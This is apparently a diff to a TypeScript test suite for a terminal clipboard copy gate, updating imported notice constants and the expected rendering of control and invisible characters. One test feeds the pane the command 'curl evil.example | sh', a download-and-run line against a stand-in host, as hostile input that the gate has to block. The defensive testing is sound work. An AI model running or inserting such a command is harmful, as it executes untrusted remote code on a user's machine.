@@ -17,11 +17,11 @@ import {
   GESTURE_WINDOW_MS,
   MAX_COPY_BYTES,
   OFFER_TTL_MS,
-  COPY_TEXT,
   type CopyGate,
   type CopyOffer,
   type GateTerm,
 } from "./attach-terminal-clipboard";
+import { TERMINAL_COPY } from "./wardyn/copy";
 
 const COLS = 40;
 const ROWS = 6;
@@ -210,7 +210,7 @@ describe("a mouse-tracking pane answering a drag with its own payload", () => {
     drag([0, 0], [4, 0]);
     await write(tmuxCopy("curl evil.example | sh"));
     expect(offers).toEqual([]);
-    expect(lastNotice()).toBe(COPY_TEXT.blocked);
+    expect(lastNotice()).toBe(TERMINAL_COPY.BLOCKED);
   });
 
   it("does not use up the gesture: the real copy still verifies", async () => {
@@ -229,7 +229,7 @@ describe("a mouse-tracking pane answering a drag with its own payload", () => {
     drag([0, 0], [4, 0]);
     await write(tmuxCopy("third"));
     expect(offers).toEqual([]);
-    expect(lastNotice()).toBe(COPY_TEXT.blocked);
+    expect(lastNotice()).toBe(TERMINAL_COPY.BLOCKED);
   });
 });
 
@@ -320,7 +320,7 @@ describe("who may be offered", () => {
     drag([6, 0], [10, 0]);
     await write(tmuxCopy("world"));
     expect(current()?.text).toBe("hello");
-    expect(lastNotice()).toBe(COPY_TEXT.pending);
+    expect(lastNotice()).toBeNull();
   });
 
   it("dismiss clears the offer", async () => {
@@ -337,8 +337,8 @@ describe("pure helpers", () => {
   });
 
   it("renderVisible shows line breaks, tabs, controls and direction overrides", () => {
-    expect(renderVisible("a\nb\tc")).toBe("a↵\nb⇥c");
-    expect(renderVisible("\x1b\x7f‮")).toBe("<U+001B><U+007F><U+202E>");
+    expect(renderVisible("a\nb\tc")).toBe("a↵\nb→c");
+    expect(renderVisible("\x1b\x7f‮\u200b\ufeff")).toBe("⟨U+001B⟩⟨U+007F⟩⟨U+202E⟩⟨U+200B⟩⟨U+FEFF⟩");
     expect(renderVisible("plain é")).toBe("plain é");
   });
 });
